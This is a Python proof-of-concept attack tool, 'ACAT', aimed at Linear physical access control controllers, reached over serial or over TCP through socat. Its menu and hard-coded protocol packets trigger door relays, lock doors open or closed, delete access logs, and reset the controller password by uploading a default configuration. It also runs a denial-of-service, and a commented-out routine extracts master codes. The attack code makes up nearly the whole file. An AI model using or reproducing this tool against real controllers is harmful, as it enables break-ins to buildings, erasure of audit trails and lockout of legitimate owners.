#!/usr/bin/python
#################################################################
# ACAT - Access Control Attack Tool - Linear Control V2.2
# By: Dennis Linuz <dennismald@gmail.com>
#
# Tools for controlling Access Control Systems
# Currently in Proof-of-Concept Mode. All commands are hard coded until taken out of PoC mode
#
# Todo:
#	- FIX: UploadConfig does not work when attacking over the internet
#	- FIX: KeyboardInterrupt not handling properly entirely (Could do with recursive functions)
#	- FIX: Make this PEP 0008 compliant
#	- ADD: Dynamic generation of command strings (removing hard-coded strings)
#	- ADD: Ability to control other nodes in the Linear network
#	- ADD: KeyboardInterrupt exception handling for brute-force (and saving of incremental progress)
#	- ADD: an "all relays" menu item"
#	- ADD: functionality for creating your own entry code
#	- ADD: More error handling (errors on start-up, for example)
#	- ADD: Dependency checks for SOCAT and PySerial
#	- ADD: Menu-item for trying a password
#	- ADD: Check for elevated privileges in Linux/Unix
#	- ADD: Uploading back doors (entry codes, transmitters, etc)
#	- ADD: More Comments
#	- ADD: Listen for Activity from Linear Controller
#	- ADD: Version variable
#################################################################

# First party libraries
import binascii
import os
import subprocess
import sys
import re
import time

# Third party Library
import serial

# Display usage information
def helpText():
	if opsys == 3:
		print ""
		print "Syntax:  ACS.py <Device>"
		print ""
	else:
		print ""
		print "Syntax:  ACS.py <Device> <Host> [port]"
		print "Default port = 4660"
		print ""
	exit()

def getMenuChoice():
	invalidChoice = 1
	while invalidChoice:
		try:
			choice = int(raw_input("> "))
			invalidChoice = 0
		except:
			pass
	return choice

def generateChecksum(input):
	packet = binascii.a2b_hex(input)
	num = 0
	num2 = 4
	while (num2 < len(packet)-2):
		num3 = int(binascii.b2a_hex(packet[num2]), 16) ^ (255 & num)
		num3 = num3 ^ (255 & num3 << 4)
		num = (num >> 8 ^ num3 << 8 ^ num3 << 3 ^ num3 >> 4)
		num2 = num2 + 1
	return packet[:-2]+binascii.a2b_hex(hex(num)[2:].zfill(4))

def SendCommand(command, len):
	#ser.write(binascii.a2b_hex("fffa2c6908fff0fffa2c7001fff0"))
	ser.write(generateChecksum(command))
	return ser.read(len)

def ClearScreen():
	if opsys == 3:
		os.system("cls")
	else:
		os.system("clear")
	
def ExitProgram():
	if not (opsys == 3):
		process.kill()
	ser.close()
	print "Closing..."
	exit()
	
def MainMenu():
	ClearScreen()
	ser.timeout = normal_timeout
	print """
			[!] POC MODE [!]
====================================================================
	ACAT - Access Control Attack Tool - Linear Control V2.2
	By: Dennis Linuz <dennismald@gmail.com>
	
	Main Menu
====================================================================

	1)	Trigger Relays (2 seconds)
	2)	Lock Doors Open
	3)	Lock Doors Closed
	4)	Unlock Relays
	5)	Delete Logs
	6)	Upload Default configuration (replacing password with default)
	7)	NOT IMPLEMENTED YET
	8)	NOT IMPLEMENTED YET
	9)	Denial-of-Service
	10)	Stop Denial-of-Service
	11)	Send raw data
	
	99)	Exit
	"""
	invalidChoice = 1
	choice = getMenuChoice()
	if choice == 1:
		RelayMenu("trigger")
	elif choice == 2:
		RelayMenu("lockopen")	
	elif choice == 3:
		RelayMenu("lockclosed")
	elif choice == 4:
		RelayMenu("unlock")
	elif choice == 5:
		DeleteLogs()
	elif choice == 6:
		UploadConfig()
	elif choice == 7:
		pass
	elif choice == 8:
		pass
	elif choice == 9:
		DOSAttack()
	elif choice == 10:
		StopDOSAttack()
	elif choice == 11:
		SendRawData()
	elif choice == 99:
		ExitProgram()

def RelayMenu(action):
	while 1:
		ClearScreen()
		print """
====================================================================
	ACAT - Access Control Attack Tool - Linear Control V2.2
	By: Dennis Linuz <dennismald@gmail.com>
	
	Choose relays to {}
====================================================================

	1) Relay 1
	2) Relay 2
	3) Relay 3
	4) Relay 4
	98) Back
	
	99) Exit
	""".format(action)
		if message:
			print message
			print ""
		choice = getMenuChoice()
		if choice == 1:
			RelayAction(action,1)
		elif choice == 2:
			RelayAction(action,2)
		elif choice == 3:
			RelayAction(action,3)
		elif choice == 4:
			RelayAction(action,4)
		elif choice == 98:
			return
		elif choice == 99:
			ExitProgram()

def RelayAction(action, relay):
	global message
	ser.timeout = bruteforce_timeout
	if action == "trigger":
		actionValue = 8
		word = "triggered"
	elif action == "lockclosed":
		actionValue = 4
		word = "locked closed"
	elif action == "lockopen":
		actionValue = 2
		word = "locked open"
	elif action == "unlock":
		actionValue = 1
		word = "unlocked"
	if relay == 1:
		position = 17
	elif relay == 2:
		position = 19
	elif relay == 3:
		position = 21
	elif relay == 4:
		position = 23
	command = list("5AA5000A11050100000000000000")
	command[position] = str(actionValue)
	command = ''.join(command)
	SendCommand(command, 1)
	message =  "Relay " + str(relay) + " has been " + word
	return
	
def DeleteLogs():
	print "Deleting logs...."
	SendCommand("5AA5000411040000", 1024)
	SendCommand("5AA50004110C0000", 1024)
	print ""
	print "Logs have been deleted"
	print ""
	raw_input("Press Enter to continue...")
	return

def UploadConfig():
	print "Uploading configuration..."
	SendCommand("5AA5026011870000001000F6003239320002030708024800FE3C027F007F007F007F001000E131323334353631323334353641544830453053303D305130264731372648320520FC415448301420FC4154483014202100FB1F900000020600FB1F500000020600FF1F0300FF020600FF1F0300FF02470002011F00FF04210018200600182006001820060018200600182006001820FE80060400182006001820060018203C00FE0F400CFF0300FE400003FFFF0003FFFF0003FF0300FF400CFF0300FE400003FFFF0003FF08000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF04000CFF7F007F007F007F007F007F007F007F007F007F007F007F002F00F8526573656172636828203000F84163636573735F411020F84163636573735F421020F84163636573735F431020F84163636573735F441020AF0100000100020003000400050006010700080109010A010B000C010D010E000F0110001101120113011400150116001701180119011A011B011C011D011E011F012000210022002300240025002600270105003F08", 1)
	SendCommand("5AA5000A1105010100000000250B",1)
	print ""
	print "Default password (and other configuration) has been sent"
	print ""
	raw_input("Press Enter to continue...")
	return
	
def DOSAttack():
	print "DOSing the controller..."
	SendCommand("5AA50009110700000000000000", 1)
	print ""
	print "Controller DOSed!"
	print ""
	raw_input("Press Enter to continue...")
	return
	
def StopDOSAttack():
	print "Fixing the controller"
	SendCommand("5AA5000A1105010100000000250B", 1)
	print ""
	print "DOS attack stopped!"
	print ""
	raw_input("Press Enter to continue...")
	return

def SendRawData():
	ClearScreen()
	print """
====================================================================
	ACAT - Access Control Attack Tool - Linear Control V2.2
	By: Dennis Linuz <dennismald@gmail.com>
	
	Send Raw data. Type "q!" to go back to the main menu
====================================================================
	"""
	while 1:
		try:
			data = raw_input("Raw input> ")
			if data == "q!":
				return
			print SendCommand(data, 2048)
		except TypeError as err:
			print err
			print ""

# def DumpConfig():
	# global found_password
	# print "Dumping configuration..."
	# result = SendCommand("5AA5000911030000001000B3F0", 1024)
	# numbers = re.search("\d\d\d\d\d\d\d\d\d\d\d\d", result)
	# if numbers:
		# found_password = numbers.group(0)[:6]
		# print ""
		# print "Master Code: " + numbers.group(0)[:6]
		# print "Priority Access Code: " + numbers.group(0)[6:12]
		# print ""
	# else:
		# print ""
		# print "Nothing found. Perhaps no one has logged into it in a while?"
		# print ""
	# raw_input("Press Enter to continue...")
	# return


# Check operating system (1=Linux, 2=Mac, 3=Windows, 99=Unknown)
if sys.platform == "win32":
	opsys = 3
elif sys.platform == "darwin":
	opsys = 2
elif sys.platform == "linux2":
	opsys = 1
else:
	opsys = 99

# Check Argument syntax
if opsys == 3:
	if not(len(sys.argv) == 2):
		print ""
		print "[!] Invalid arguments"
		helpText()
else:
	if len(sys.argv) < 3:
		print ""
		print "[!] Not enough arguments"
		helpText()
	elif len(sys.argv) == 3:
		port == 4660
	elif len(sys.argv) > 4:
		print ""
		print "[!] Too many arguments"
		helpText()

serial_interface = sys.argv[1]
bruteforce_timeout = 0.1
normal_timeout = 5.0
baudrate = 38400
choice = ""
action = ""
relay = ""
found_password = ""
message = ""
if not opsys == 3:
	host = sys.argv[2]
	port = sys.argv[3]

# Ensure that the port number is valid
if not(opsys == 3):
	try:
		port = int(port)
		if not(port in range(1,65535)):
			print "[!] Port number out of range"
			helpText()
	except:
		print ""
		print "[!] Port not a valid number"
		helpText()


#Start process for socat if not using Windows
if not (opsys == 3):
	process = subprocess.Popen("exec socat PTY,link=" + serial_interface + " TCP:" + host + ":" + str(port), shell=True)
	time.sleep(4)

# Start serial connection on specified interface
ser = serial.Serial(serial_interface, baudrate=baudrate, timeout=normal_timeout)

# Start the program
while 1:
	MainMenu()




